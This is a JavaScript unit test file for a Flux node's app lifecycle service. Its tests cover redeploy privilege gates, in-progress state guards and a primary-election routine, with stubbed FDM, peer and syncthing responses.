// Set NODE_CONFIG_DIR before any requires
process.env.NODE_CONFIG_DIR = `${process.cwd()}/tests/unit/globalconfig`;

const { expect } = require('chai');
const sinon = require('sinon');
const axios = require('axios');
const config = require('config');
const advancedWorkflows = require('../../ZelBack/src/services/appLifecycle/advancedWorkflows');
const { Privilege, authOf } = require('../../ZelBack/src/services/utils/privileges');
const dbHelper = require('../../ZelBack/src/services/dbHelper');
const appsRuntimeState = require('../../ZelBack/src/services/appManagement/appsRuntimeState');
const log = require('../../ZelBack/src/lib/log');

describe('advancedWorkflows tests', () => {
  afterEach(() => {
    sinon.restore();
  });

  describe('setInstallationInProgress and getInstallationInProgress tests', () => {
    it('should set installation in progress', () => {
      advancedWorkflows.setInstallationInProgressTrue();

      const inProgress = advancedWorkflows.getInstallationInProgress();
      expect(inProgress).to.be.true;
    });

    it('should reset installation in progress', () => {
      advancedWorkflows.setInstallationInProgressTrue();
      advancedWorkflows.installationInProgressReset();

      const inProgress = advancedWorkflows.getInstallationInProgress();
      expect(inProgress).to.be.false;
    });

    it('should set specific app installation in progress', () => {
      advancedWorkflows.setInstallationInProgress('TestApp', true);

      const inProgress = advancedWorkflows.getInstallationInProgress();
      // When setting specific app, function returns the app name, not just true
      expect(inProgress).to.equal('TestApp');
    });
  });

  describe('setRemovalInProgress and getRemovalInProgress tests', () => {
    it('should set removal in progress', () => {
      advancedWorkflows.setRemovalInProgressToTrue();

      const inProgress = advancedWorkflows.getRemovalInProgress();
      expect(inProgress).to.be.true;
    });

    it('should reset removal in progress', () => {
      advancedWorkflows.setRemovalInProgressToTrue();
      advancedWorkflows.removalInProgressReset();

      const inProgress = advancedWorkflows.getRemovalInProgress();
      expect(inProgress).to.be.false;
    });

    it('should set specific app removal in progress', () => {
      advancedWorkflows.setRemovalInProgress('TestApp', true);

      const inProgress = advancedWorkflows.getRemovalInProgress();
      // When setting specific app, function returns the app name, not just true
      expect(inProgress).to.equal('TestApp');
    });
  });

  describe('redeployComponentAPI tests', () => {
    let req;
    let res;
    let globalState;
    let verificationHelper;

    beforeEach(() => {
      // eslint-disable-next-line global-require
      globalState = require('../../ZelBack/src/services/utils/globalState');
      globalState.removalInProgress = false;
      globalState.installationInProgress = false;
      globalState.softRedeployInProgress = false;
      globalState.hardRedeployInProgress = false;
      globalState.restoreInProgress = [];

      // eslint-disable-next-line global-require
      verificationHelper = require('../../ZelBack/src/services/verificationHelper');

      req = {
        params: {},
        query: {},
        headers: {},
      };
      res = {
        json: sinon.stub(),
        write: sinon.stub(),
        flush: sinon.stub(),
        setHeader: sinon.stub(),
      };
    });

    it('should return error if appname is not provided', async () => {
      req.params.component = 'frontend';

      await advancedWorkflows.redeployComponentAPI(req, res);

      expect(res.json.calledOnce).to.be.true;
      const response = res.json.firstCall.args[0];
      expect(response.status).to.equal('error');
      expect(response.data.message).to.include('No Flux App specified');
    });

    it('should return error if component is not provided', async () => {
      req.params.appname = 'myapp';

      await advancedWorkflows.redeployComponentAPI(req, res);

      expect(res.json.calledOnce).to.be.true;
      const response = res.json.firstCall.args[0];
      expect(response.status).to.equal('error');
      expect(response.data.message).to.include('No component specified');
    });

    it('should return error if appname contains underscore', async () => {
      req.params.appname = 'frontend_myapp';
      req.params.component = 'frontend';

      await advancedWorkflows.redeployComponentAPI(req, res);

      expect(res.json.calledOnce).to.be.true;
      const response = res.json.firstCall.args[0];
      expect(response.status).to.equal('error');
      expect(response.data.message).to.include('Invalid app name format');
    });

    it('should skip redeploy if app is in restore progress', async () => {
      req.params.appname = 'myapp';
      req.params.component = 'frontend';

      // the claim's own primitive - the list is a frozen snapshot to reads
      globalState.tryStartRestore('myapp');

      sinon.stub(verificationHelper, 'verifyPrivilege').resolves(true);

      await advancedWorkflows.redeployComponentAPI(req, res);

      expect(res.json.calledOnce).to.be.true;
      const response = res.json.firstCall.args[0];
      expect(response.status).to.equal('warning');
      expect(response.data.message).to.include('Restore is running');

      // Clean up
      globalState.finishRestore('myapp');
    });

    // The gate IS the policy: appownerorfluxteam refuses the node operator, and a
    // forced redeploy rm -rf's the component's volume, so admitting them here
    // would be the way around the appremove gate that already refuses them.
    it('gates a component redeploy on the privilege that refuses the node operator', async () => {
      req.params.appname = 'myapp';
      req.params.component = 'frontend';

      sinon.stub(verificationHelper, 'verifyPrivilege').resolves(false);

      await advancedWorkflows.redeployComponentAPI(req, res);

      expect(res.json.calledOnce).to.be.true;
      sinon.assert.calledOnceWithExactly(verificationHelper.verifyPrivilege, Privilege.APP_OWNER_OR_FLUX_TEAM, authOf(req), { appName: 'myapp' });
    });

    it('should handle force parameter from query string', async () => {
      req.params.appname = 'myapp';
      req.params.component = 'frontend';
      req.query.force = 'true';

      sinon.stub(verificationHelper, 'verifyPrivilege').resolves(true);
      sinon.stub(dbHelper, 'databaseConnection').returns({
        db: () => ({}),
      });
      sinon.stub(dbHelper, 'findOneInDatabase').resolves(null);

      await advancedWorkflows.redeployComponentAPI(req, res);

      // Should attempt to call hardRedeployComponent but will fail because app not found
      expect(res.json.calledOnce).to.be.true;
    });
  });

  // The whole-app gate matters for the same reason the component one does, and
  // for more of the app: force=true takes every component through a hard
  // uninstall, so all of the app's data on this node goes with it.
  describe('redeployAPI tests', () => {
    let req;
    let res;
    let globalState;
    let verificationHelper;

    beforeEach(() => {
      // eslint-disable-next-line global-require
      globalState = require('../../ZelBack/src/services/utils/globalState');
      globalState.restoreInProgress = [];

      // eslint-disable-next-line global-require
      verificationHelper = require('../../ZelBack/src/services/verificationHelper');

      req = { params: {}, query: {}, headers: {} };
      res = {
        json: sinon.stub(),
        write: sinon.stub(),
        flush: sinon.stub(),
        setHeader: sinon.stub(),
      };
    });

    it('gates a redeploy on the privilege that refuses the node operator', async () => {
      req.params.appname = 'myapp';

      sinon.stub(verificationHelper, 'verifyPrivilege').resolves(false);

      await advancedWorkflows.redeployAPI(req, res);

      expect(res.json.calledOnce).to.be.true;
      sinon.assert.calledOnceWithExactly(verificationHelper.verifyPrivilege, Privilege.APP_OWNER_OR_FLUX_TEAM, authOf(req), { appName: 'myapp' });
    });
  });

  describe('softRedeployComponent tests', () => {
    let globalState;
    let res;

    beforeEach(() => {
      // eslint-disable-next-line global-require
      globalState = require('../../ZelBack/src/services/utils/globalState');
      globalState.removalInProgress = false;
      globalState.installationInProgress = false;
      globalState.softRedeployInProgress = false;
      globalState.hardRedeployInProgress = false;

      res = {
        write: sinon.stub(),
        flush: sinon.stub(),
      };
    });

    it('should return early if removal is in progress', async () => {
      globalState.removalInProgress = true;

      await advancedWorkflows.softRedeployComponent('myapp', 'frontend', res);

      expect(res.write.calledOnce).to.be.true;
      const response = res.write.firstCall.args[0];
      expect(response).to.include('Another application is undergoing removal');
    });

    it('should return early if installation is in progress', async () => {
      globalState.installationInProgress = true;

      await advancedWorkflows.softRedeployComponent('myapp', 'frontend', res);

      expect(res.write.calledOnce).to.be.true;
      const response = res.write.firstCall.args[0];
      expect(response).to.include('Another application is undergoing installation');
    });

    it('should return early if soft redeploy is in progress', async () => {
      globalState.softRedeployInProgress = true;

      await advancedWorkflows.softRedeployComponent('myapp', 'frontend', res);

      expect(res.write.calledOnce).to.be.true;
      const response = res.write.firstCall.args[0];
      expect(response).to.include('Another application is undergoing soft redeploy');
    });

    it('should return early if hard redeploy is in progress', async () => {
      globalState.hardRedeployInProgress = true;

      await advancedWorkflows.softRedeployComponent('myapp', 'frontend', res);

      expect(res.write.calledOnce).to.be.true;
      const response = res.write.firstCall.args[0];
      expect(response).to.include('Another application is undergoing hard redeploy');
    });

    it('should throw error if application not found', async () => {
      sinon.stub(dbHelper, 'databaseConnection').returns({
        db: () => ({}),
      });
      sinon.stub(dbHelper, 'findOneInDatabase').resolves(null);

      try {
        await advancedWorkflows.softRedeployComponent('myapp', 'frontend', res);
        expect.fail('Should have thrown error');
      } catch (error) {
        expect(error.message).to.include('Application myapp not found');
        expect(globalState.softRedeployInProgress).to.be.false;
      }
    });

    it('should throw error if app is not composed', async () => {
      sinon.stub(dbHelper, 'databaseConnection').returns({
        db: () => ({}),
      });
      sinon.stub(dbHelper, 'findOneInDatabase').resolves({
        name: 'myapp',
        version: 3,
        // No compose field
      });

      try {
        await advancedWorkflows.softRedeployComponent('myapp', 'frontend', res);
        expect.fail('Should have thrown error');
      } catch (error) {
        expect(error.message).to.include('is not a composed application');
        expect(globalState.softRedeployInProgress).to.be.false;
      }
    });

    it('should throw error if component not found in app', async () => {
      sinon.stub(dbHelper, 'databaseConnection').returns({
        db: () => ({}),
      });
      sinon.stub(dbHelper, 'findOneInDatabase').resolves({
        name: 'myapp',
        version: 4,
        compose: [
          { name: 'backend', repotag: 'myapp/backend:1.0' },
        ],
      });

      try {
        await advancedWorkflows.softRedeployComponent('myapp', 'frontend', res);
        expect.fail('Should have thrown error');
      } catch (error) {
        expect(error.message).to.include('Component frontend not found');
        expect(globalState.softRedeployInProgress).to.be.false;
      }
    });
  });

  describe('hardRedeployComponent tests', () => {
    let globalState;
    let res;

    beforeEach(() => {
      // eslint-disable-next-line global-require
      globalState = require('../../ZelBack/src/services/utils/globalState');
      globalState.removalInProgress = false;
      globalState.installationInProgress = false;
      globalState.softRedeployInProgress = false;
      globalState.hardRedeployInProgress = false;

      res = {
        write: sinon.stub(),
        flush: sinon.stub(),
      };
    });

    it('should return early if removal is in progress', async () => {
      globalState.removalInProgress = true;

      await advancedWorkflows.hardRedeployComponent('myapp', 'frontend', res);

      expect(res.write.calledOnce).to.be.true;
      const response = res.write.firstCall.args[0];
      expect(response).to.include('Another application is undergoing removal');
    });

    it('should return early if installation is in progress', async () => {
      globalState.installationInProgress = true;

      await advancedWorkflows.hardRedeployComponent('myapp', 'frontend', res);

      expect(res.write.calledOnce).to.be.true;
      const response = res.write.firstCall.args[0];
      expect(response).to.include('Another application is undergoing installation');
    });

    it('should return early if soft redeploy is in progress', async () => {
      globalState.softRedeployInProgress = true;

      await advancedWorkflows.hardRedeployComponent('myapp', 'frontend', res);

      expect(res.write.calledOnce).to.be.true;
      const response = res.write.firstCall.args[0];
      expect(response).to.include('Another application is undergoing soft redeploy');
    });

    it('should return early if hard redeploy is in progress', async () => {
      globalState.hardRedeployInProgress = true;

      await advancedWorkflows.hardRedeployComponent('myapp', 'frontend', res);

      expect(res.write.calledOnce).to.be.true;
      const response = res.write.firstCall.args[0];
      expect(response).to.include('Another application is undergoing hard redeploy');
    });

    it('should throw error if application not found', async () => {
      sinon.stub(dbHelper, 'databaseConnection').returns({
        db: () => ({}),
      });
      sinon.stub(dbHelper, 'findOneInDatabase').resolves(null);

      try {
        await advancedWorkflows.hardRedeployComponent('myapp', 'frontend', res);
        expect.fail('Should have thrown error');
      } catch (error) {
        expect(error.message).to.include('Application myapp not found');
        expect(globalState.hardRedeployInProgress).to.be.false;
      }
    });

    it('should throw error if app is not composed', async () => {
      sinon.stub(dbHelper, 'databaseConnection').returns({
        db: () => ({}),
      });
      sinon.stub(dbHelper, 'findOneInDatabase').resolves({
        name: 'myapp',
        version: 3,
        // No compose field
      });

      try {
        await advancedWorkflows.hardRedeployComponent('myapp', 'frontend', res);
        expect.fail('Should have thrown error');
      } catch (error) {
        expect(error.message).to.include('is not a composed application');
        expect(globalState.hardRedeployInProgress).to.be.false;
      }
    });

    it('should throw error if component not found in app', async () => {
      sinon.stub(dbHelper, 'databaseConnection').returns({
        db: () => ({}),
      });
      sinon.stub(dbHelper, 'findOneInDatabase').resolves({
        name: 'myapp',
        version: 4,
        compose: [
          { name: 'backend', repotag: 'myapp/backend:1.0' },
        ],
      });

      try {
        await advancedWorkflows.hardRedeployComponent('myapp', 'frontend', res);
        expect.fail('Should have thrown error');
      } catch (error) {
        expect(error.message).to.include('Component frontend not found');
        expect(globalState.hardRedeployInProgress).to.be.false;
      }
    });

    it('should set hardRedeployInProgress to false on error', async () => {
      sinon.stub(dbHelper, 'databaseConnection').returns({
        db: () => ({}),
      });
      sinon.stub(dbHelper, 'findOneInDatabase').resolves(null);

      try {
        await advancedWorkflows.hardRedeployComponent('myapp', 'frontend', res);
        expect.fail('Should have thrown error');
      } catch (error) {
        expect(globalState.hardRedeployInProgress).to.be.false;
      }
    });
  });

  // Note: masterSlaveApps is a recursive function that continuously runs in production.
  // These tests use a counter to prevent infinite recursion after the first iteration.
  describe('masterSlaveApps tests', () => {
    let globalState;
    let serviceHelperStub;
    let serviceHelperDelayStub;
    let fluxNetworkHelperStub;
    let registryManagerStub;
    let dockerServiceStub;
    let syncthingServiceStub;
    let syncthingCompletionStub;
    let syncthingDevicesStub;
    let axiosGetStub;
    let recursionCounter;

    // What FDM sends when it IS answering and this app simply has no primary
    // yet: a success body carrying an empty ips array. test-infra/fdm-stub
    // returns exactly this, and it is a different fact from FDM not answering
    // at all - that arrives as a rejection and stands the election down.
    // A factory, not a shared literal, so no test can leak a mutation forward.
    const fdmNoPrimary = () => ({ data: { status: 'success', data: { ips: [] } } });

    beforeEach(() => {
      recursionCounter = 0;
      globalState = require('../../ZelBack/src/services/utils/globalState');
      globalState.masterSlaveAppsRunning = false;
      globalState.installationInProgress = false;
      globalState.removalInProgress = false;
      globalState.softRedeployInProgress = false;
      globalState.hardRedeployInProgress = false;
      // the syncthing monitor's first-run mount-safety is assumed complete for the
      // election tests; a dedicated test below covers the not-complete skip
      globalState.syncthingAppsFirstRun = false;
      // the election reads the busy lists and the receive-only cache off the
      // real module now - state left by a prior test must not leak into this one
      globalState.receiveOnlySyncthingAppsCache.clear();
      globalState.backupInProgress.forEach((a) => globalState.finishBackup(a));
      globalState.restoreInProgress.forEach((a) => globalState.finishRestore(a));

      // Setup stubs
      const serviceHelper = require('../../ZelBack/src/services/serviceHelper');
      serviceHelperStub = sinon.stub(serviceHelper, 'axiosGet');

      // Stub delay to prevent recursive calls - after first call, block recursion
      serviceHelperDelayStub = sinon.stub(serviceHelper, 'delay').callsFake(async () => {
        recursionCounter += 1;
        if (recursionCounter > 1) {
          // Prevent recursion by returning a promise that never resolves
          return new Promise(() => {});
        }
        return Promise.resolve();
      });

      const fluxNetworkHelper = require('../../ZelBack/src/services/fluxNetworkHelper');
      fluxNetworkHelperStub = sinon.stub(fluxNetworkHelper, 'getLocalSocketAddress');

      const registryManager = require('../../ZelBack/src/services/appDatabase/registryManager');
      registryManagerStub = sinon.stub(registryManager, 'appLocation');

      const dockerService = require('../../ZelBack/src/services/dockerService');
      dockerServiceStub = sinon.stub(dockerService, 'getAppIdentifier');

      const syncthingService = require('../../ZelBack/src/services/syncthingService');
      syncthingServiceStub = sinon.stub(syncthingService, 'getConfigFolders');
      sinon.stub(syncthingService, 'getHealth').resolves({ status: 'OK' });

      // Stub decryptEnterpriseApps to return apps as-is
      const appQueryService = require('../../ZelBack/src/services/appQuery/appQueryService');
      sinon.stub(appQueryService, 'decryptEnterpriseApps').callsFake((apps) => Promise.resolve({ readable: apps, unreadable: [], inPlace: apps }));

      // Stub database connection to prevent actual DB access
      sinon.stub(dbHelper, 'databaseConnection').returns({
        db: () => ({}),
      });
      sinon.stub(dbHelper, 'findOneInDatabase').resolves(null);

      // The peer probe hits /apps/heldcomponents and /apps/listrunningapps on the
      // other nodes in the location list. Unstubbed these become real network
      // calls with a 10s ceiling each, so every election test would hang on
      // unroutable fixture IPs. Default to unreachable, which the probe treats as
      // UNKNOWN and will not start beside - so a test that expects a start must
      // say what its peers answer.
      axiosGetStub = sinon.stub(axios, 'get').rejects(new Error('peer unreachable (test default)'));

      // The evidence half: this node's own syncthing view of a silent peer, and
      // whether this node can still see the fleet. Defaults are the ignorant node
      // (no device ever resolved) on a healthy fleet, so a test that wants a
      // silence acted on has to supply the evidence for it.
      const syncthingServiceModule = require('../../ZelBack/src/services/syncthingService');
      syncthingCompletionStub = sinon.stub(syncthingServiceModule, 'getDbCompletion').resolves(null);
      syncthingDevicesStub = sinon.stub(syncthingServiceModule, 'getConfigDevices').resolves([]);
      globalState.syncthingDevicesIDCache.clear();
      const fluxCommunication = require('../../ZelBack/src/services/fluxCommunication');
      sinon.stub(fluxCommunication, 'peerResponsiveness').returns({ responding: 4, total: 4 });
    });

    it('should skip execution if installation is in progress', async () => {
      globalState.installationInProgress = true;

      const installedApps = sinon.stub().resolves({ status: 'success', data: [] });
      const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
      const https = require('https');

      await advancedWorkflows.masterSlaveApps(
        globalState,
        installedApps,
        listRunningApps,
        https,
      );

      expect(installedApps.called).to.be.false;
    });

    it('should skip execution if removal is in progress', async () => {
      globalState.removalInProgress = true;

      const installedApps = sinon.stub().resolves({ status: 'success', data: [] });
      const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
      const https = require('https');

      await advancedWorkflows.masterSlaveApps(
        globalState,
        installedApps,
        listRunningApps,
        https,
      );

      expect(installedApps.called).to.be.false;
    });

    it('skips the whole cycle until the syncthing first-run mount-safety has completed', async () => {
      globalState.syncthingAppsFirstRun = true; // syncthing monitor first run not done yet
      const installedApps = sinon.stub().resolves({ status: 'success', data: [] });
      const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });

      await advancedWorkflows.masterSlaveApps(
        globalState,
        installedApps,
        listRunningApps,
        require('https'),
      );

      // guard returns before any election work, so installed apps are never read
      expect(installedApps.called).to.be.false;
    });

    // The busy claim goes through the real primitive and the election reads the
    // busy list off globalState itself - these two tests cover the WIRING, not a
    // parameter. The old parameter-based version stayed green while the guard was
    // dead in production (the boot capture went stale behind it).
    it('should skip apps in backup progress', async () => {
      const appName = 'testapp';
      const installedApps = sinon.stub().resolves({
        status: 'success',
        data: [
          {
            name: appName,
            version: 3,
            containerData: 'g:/data',
          },
        ],
      });
      const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
      const https = require('https');

      // Mock FDM to return no errors
      serviceHelperStub.resolves(fdmNoPrimary());

      expect(globalState.tryStartBackup(appName)).to.equal(true);
      try {
        await advancedWorkflows.masterSlaveApps(
          globalState,
          installedApps,
          listRunningApps,
          https,
        );

        // Function should have been called to get installed apps
        expect(installedApps.called).to.be.true;
        // But FDM should not be queried since app is skipped
        expect(serviceHelperStub.called).to.be.false;
      } finally {
        globalState.finishBackup(appName);
      }
    });

    it('should skip apps in restore progress', async () => {
      const appName = 'testapp';
      const installedApps = sinon.stub().resolves({
        status: 'success',
        data: [
          {
            name: appName,
            version: 3,
            containerData: 'g:/data',
          },
        ],
      });
      const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
      const https = require('https');

      serviceHelperStub.resolves(fdmNoPrimary());

      expect(globalState.tryStartRestore(appName)).to.equal(true);
      try {
        await advancedWorkflows.masterSlaveApps(
          globalState,
          installedApps,
          listRunningApps,
          https,
        );

        expect(installedApps.called).to.be.true;
        expect(serviceHelperStub.called).to.be.false;
      } finally {
        globalState.finishRestore(appName);
      }
    });

    // Shared fixture for the recovery tests below: a v3 g: app with this node in
    // the location list. `peers` are the other nodes, in election order.
    // `selfRunningSince` places this node in the election order; `receiveOnlyCache`
    // lets a test seed the syncthing state machine's per-app cache and inspect it
    // afterwards. Both default to the plain index-0 fixture.
    const electionFixture = (appName, peers = [], options = {}) => {
      const {
        selfRunningSince = '2026-01-01T00:00:00.000Z',
        receiveOnlyCache = new Map(),
        // A v4+ spec elects on `<component>_<app>`, a v3 one on the bare app
        // name. Both forms have to be reachable here: the election writes one
        // and isElectedPrimaryHere matches the other back.
        componentName = null,
      } = options;
      const identifier = componentName ? `${componentName}_${appName}` : appName;
      // Mirror getAppIdentifier: a name that is neither zel- nor flux-prefixed gets
      // `flux`. The container names peers report are this exact string, and the
      // election compares whole names, so a stand-in value would not match.
      const appId = `flux${identifier}`;
      dockerServiceStub.returns(appId);
      const installedApps = sinon.stub().resolves({
        status: 'success',
        data: [componentName
          ? { name: appName, version: 8, compose: [{ name: componentName, containerData: 'g:/syncdata' }] }
          : { name: appName, version: 3, containerData: 'g:/syncdata' }],
      });
      const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
      // Entries land in the real globalState cache - the election reads it off
      // the module, not off a parameter. The entry OBJECTS are shared between
      // the test's own map and the global one, so a test that inspects (or
      // mutates) its map afterwards still meets production's in-place writes.
      receiveOnlyCache.forEach((value, key) => globalState.receiveOnlySyncthingAppsCache.set(key, value));
      if (!globalState.receiveOnlySyncthingAppsCache.has(appId)) globalState.receiveOnlySyncthingAppsCache.set(appId, { restarted: true });
      fluxNetworkHelperStub.resolves('192.168.1.5:16127');
      // Election order is runningSince ascending, with ip only as a tiebreak. Give
      // explicit, distinct timestamps so this node's index rests on the primary key
      // rather than on how two IPs happen to sort as strings. Peers are one minute
      // apart from 00:01, so a selfRunningSince between two of them puts this node
      // between those peers - the only arrangement with a peer ABOVE us.
      registryManagerStub.resolves([
        { name: appName, ip: '192.168.1.5:16127', runningSince: selfRunningSince },
        ...peers.map((ip, n) => ({ name: appName, ip, runningSince: `2026-01-01T00:0${n + 1}:00.000Z` })),
      ]);
      syncthingServiceStub.resolves({
        status: 'success',
        data: [{ path: `/root/.flux/ZelApps/${appId}`, type: 'sendreceive' }],
      });

      // masterSlaveApps re-invokes itself from its own finally, so a single call
      // otherwise executes the election twice and every count assertion doubles.
      // Let exactly one full pass run: the first delay resolves but arms the
      // installation gate so the recursive pass returns at the top, and the second
      // delay never resolves so the chain stops there.
      let delayCalls = 0;
      serviceHelperDelayStub.resetBehavior();
      serviceHelperDelayStub.callsFake(async () => {
        delayCalls += 1;
        if (delayCalls === 1) {
          globalState.installationInProgress = true;
          return undefined;
        }
        return new Promise(() => {});
      });

      return async () => {
        delayCalls = 0;
        globalState.installationInProgress = false;
        await advancedWorkflows.masterSlaveApps(
          globalState, installedApps, listRunningApps, require('https'),
        );
      };
    };

    // The probe asks /apps/heldcomponents first and only falls back to
    // /apps/listrunningapps when a peer cannot serve it, so a stub has to answer
    // per URL. `held: null` is a peer too old to know the endpoint.
    // A node too old for /apps/heldcomponents replies 404, and axios carries that
    // reply on error.response. A bare rejection is what an UNREACHABLE node looks
    // like, and the two must not be interchangeable here: one is a peer answering
    // the old way, the other is a peer that cannot be ruled out at all.
    const peerAnswers = ({ held = null, running = [] }) => (url) => {
      if (url.includes('/apps/heldcomponents')) {
        return held === null
          ? Promise.reject(Object.assign(new Error('Request failed with status code 404'), { response: { status: 404 } }))
          : Promise.resolve({ data: { data: held } });
      }
      return Promise.resolve({ data: { data: running } });
    };

    // This node's own syncthing view of a peer's device, which is what a silence is
    // judged on. 'valid' is a live connection; any other state is a closed one; and
    // leaving the device out of the cache entirely is the third answer - this node
    // never resolved the peer and cannot say.
    const peerSyncthingSays = (peerSocketAddr, remoteState) => {
      globalState.syncthingDevicesIDCache.set(peerSocketAddr, `DEVICE-${peerSocketAddr}`);
      syncthingCompletionStub.resolves({ remoteState });
    };

    const linesMatching = (logInfo, needle) => logInfo.getCalls()
      .map((call) => String(call.args[0]))
      .filter((msg) => msg.includes(needle));

    // FDM has three answers, not two: it names a primary, it says this app has
    // none yet, or it does not answer at all. The first two arrive alike as a
    // null ip and only fdmOk separates the third from them. Reading silence as
    // "no primary yet" is how a node that has lost FDM entirely walks into
    // promoting itself onto a volume whose primary it simply cannot see.
    describe('the three answers FDM can give', () => {
      // No response object at all - a refused connection or a timeout, which is
      // what an FDM outage looks like from the node.
      const fdmUnreachable = () => new Error('connect ECONNREFUSED 10.0.0.1:16130');
      const fdmHttpError = (status) => Object.assign(
        new Error(`Request failed with status code ${status}`),
        { response: { status } },
      );

      it('stands down when no region answers, instead of reading silence as "no primary"', async () => {
        const appName = 'fdmsilentapp';
        sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
        const logInfo = sinon.stub(log, 'info');
        const logWarn = sinon.stub(log, 'warn');
        sinon.stub(log, 'error');
        const runPass = electionFixture(appName, ['192.168.1.90:16127']);
        serviceHelperStub.rejects(fdmUnreachable());
        axiosGetStub.resetBehavior();
        // No peer holds it either, so nothing else in the pass is keeping this
        // node down - a stand-down here can only be the unanswered FDM.
        axiosGetStub.callsFake(peerAnswers({ held: [] }));

        await runPass();

        expect(serviceHelperStub.callCount).to.equal(3); // every region tried first
        expect(linesMatching(logWarn, 'All FDM services failed')).to.have.lengthOf(1);
        // the two readings that must never be conflated, and the act that follows
        expect(linesMatching(logInfo, 'has currently no primary set')).to.have.lengthOf(0);
        expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
      });

      it('does not take a 503 for an answer - FDM reporting itself as starting up has named nothing', async () => {
        const appName = 'fdm503app';
        sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
        const logInfo = sinon.stub(log, 'info');
        const logWarn = sinon.stub(log, 'warn');
        const runPass = electionFixture(appName, ['192.168.1.90:16127']);
        serviceHelperStub.rejects(fdmHttpError(503));
        axiosGetStub.resetBehavior();
        axiosGetStub.callsFake(peerAnswers({ held: [] }));

        await runPass();

        expect(linesMatching(logWarn, 'All FDM services failed')).to.have.lengthOf(1);
        expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
      });

      it('treats a 404 from every region as an answer, so an app FDM holds no record of still elects', async () => {
        // The first primary of a newly deployed g: app is chosen while FDM has
        // never heard of the app. Standing down on a 404 would leave it without a
        // primary for as long as FDM had no row for it - a deadlock, not a guard.
        const appName = 'fdm404app';
        sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
        const logInfo = sinon.stub(log, 'info');
        const logWarn = sinon.stub(log, 'warn');
        const runPass = electionFixture(appName, ['192.168.1.90:16127']);
        serviceHelperStub.rejects(fdmHttpError(404));
        axiosGetStub.resetBehavior();
        axiosGetStub.callsFake(peerAnswers({ held: [] }));

        await runPass();

        expect(linesMatching(logWarn, 'All FDM services failed')).to.have.lengthOf(0);
        expect(linesMatching(logInfo, 'has currently no primary set')).to.have.lengthOf(1);
        expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
      });

      it('needs only one region to answer, so losing two of the three does not stand the election down', async () => {
        // fdmOk asks whether ANY region gave a verdict. Requiring all three would
        // stand every g: app down on the routine failure of a single region.
        const appName = 'fdmpartialapp';
        sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
        const logInfo = sinon.stub(log, 'info');
        const logWarn = sinon.stub(log, 'warn');
        sinon.stub(log, 'error');
        const runPass = electionFixture(appName, ['192.168.1.90:16127']);
        serviceHelperStub.onCall(0).rejects(fdmUnreachable());
        serviceHelperStub.onCall(1).rejects(fdmUnreachable());
        serviceHelperStub.onCall(2).resolves(fdmNoPrimary());
        axiosGetStub.resetBehavior();
        axiosGetStub.callsFake(peerAnswers({ held: [] }));

        await runPass();

        expect(serviceHelperStub.callCount).to.equal(3);
        expect(linesMatching(logWarn, 'All FDM services failed')).to.have.lengthOf(0);
        expect(linesMatching(logInfo, 'has currently no primary set')).to.have.lengthOf(1);
        expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
      });
    });

    it('announces the exclusion once when a g: component is operator-stopped, not every cycle', async () => {
      const appName = 'opstoppedapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(true);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName);

      await runPass();

      // positive proof the skip branch is what ran: election never reached FDM
      expect(serviceHelperStub.called).to.be.false;
      expect(linesMatching(logInfo, 'operator-stopped')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'operator-stopped')[0]).to.include(appName);

      // a second 30s cycle must NOT repeat it - the latch is what makes the line
      // affordable at election cadence
      await runPass();
      expect(linesMatching(logInfo, 'operator-stopped')).to.have.lengthOf(1);
    });

    it('announces again after the operator lock is lifted and re-applied', async () => {
      const appName = 'relockapp';
      const operatorStopped = sinon.stub(appsRuntimeState, 'isOperatorStopped');
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName);
      serviceHelperStub.resolves(fdmNoPrimary());

      operatorStopped.resetBehavior();
      operatorStopped.resolves(true);
      await runPass();
      expect(linesMatching(logInfo, 'operator-stopped')).to.have.lengthOf(1);

      // operator starts it again - the latch must clear
      operatorStopped.resetBehavior();
      operatorStopped.resolves(false);
      await runPass();
      expect(linesMatching(logInfo, 'operator-stopped')).to.have.lengthOf(1);

      // and a fresh stop must be announced rather than swallowed by a stale latch
      operatorStopped.resetBehavior();
      operatorStopped.resolves(true);
      await runPass();
      expect(linesMatching(logInfo, 'operator-stopped')).to.have.lengthOf(2);
    });

    it('lets a stopped last-primary be elected again by clearing its own stale record', async () => {
      const appName = 'lastprimaryapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      // The peer answers and holds nothing. Left unreachable it would hold the
      // start on its own, and this test would pass or fail on the peer probe
      // rather than on the eviction it is about.
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [] }));

      // Cycle 1: FDM names THIS node as primary, so the node records itself.
      serviceHelperStub.resetBehavior();
      serviceHelperStub.resolves({ data: { status: 'success', data: { ips: ['192.168.1.5'] } } });
      await runPass();

      // Judge only what the SECOND cycle does - cycle 1 legitimately starts the app
      // (FDM named this node), and crediting that start to the eviction would make
      // this test pass with the fix removed.
      logInfo.resetHistory();

      // Cycle 2: the app has been stopped and FDM no longer names a primary. The
      // node is index 0 and remembers ITSELF, which disqualifies it from both the
      // no-history start and the previous-primary branch. Without the eviction it
      // logs "conditions not met" forever and the app never returns.
      serviceHelperStub.resetBehavior();
      serviceHelperStub.resolves(fdmNoPrimary());
      await runPass();

      expect(linesMatching(logInfo, 'cleared this node\'s own stale primary record')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'conditions not met')).to.have.lengthOf(0);
